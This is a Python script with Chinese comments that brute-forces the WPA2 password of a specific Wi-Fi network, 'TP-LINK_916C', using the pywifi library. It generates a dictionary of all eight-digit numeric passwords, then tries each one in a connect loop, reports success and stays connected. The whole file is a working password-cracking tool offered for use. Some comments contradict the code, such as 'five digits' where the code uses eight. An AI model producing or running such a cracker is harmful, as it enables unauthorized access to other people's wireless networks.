# coding:utf-8
import pywifi
from pywifi import const
import time
import itertools as its

c = input('Creat a password dictionaty? (y/n)')
if c.lower().startswith('y'):
    print('Creating password dictionaty, please wait......')
    #迭代器
    words="1234567890"
    #生成密码本的位数，五位数，repeat=5
    r=its.product(words,repeat=8)
    #保存在文件中，追加
    dic=open(r"C:\Users\win10\Desktop\password.txt","w")
    #i是元组
    for i in r:
        #jion空格链接
        dic.write("".join(i))
        dic.write("".join("\n"))
        print(i)
    dic.close()
    input("Password dictionaty created successfully. Press enter to continue......")

#测试连接，返回链接结果
def wifiConnect(pwd):
    #抓取网卡接口
    wifi=pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces=wifi.interfaces()[0]
    #断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus=ifaces.status()
    if wifistatus ==const.IFACE_DISCONNECTED:
        #创建WiFi连接文件
        profile=pywifi.Profile()
        #要连接WiFi的名称
        profile.ssid="TP-LINK_916C"
        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN
        #wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #调用密码
        profile.key=pwd
        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        #wifi连接时间
        time.sleep(3)
        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接") 
 
#读取密码本
def readPassword():
    print("开始破解:")
    #密码本路径
    path="C:/Users/win10/Desktop/password.txt"
    #打开文件
    file=open(path,"r")
    while True:
        try:
            #一行一行读取
            pad=file.readline()
            bool=wifiConnect(pad)
            
            if bool:
                print("密码已破解： ",pad)
                print("WiFi已自动连接！！！")
                break
            else:
                #跳出当前循环，进行下一次循环
                print("密码破解中....密码校对: ",pad)
        except:
            continue
readPassword()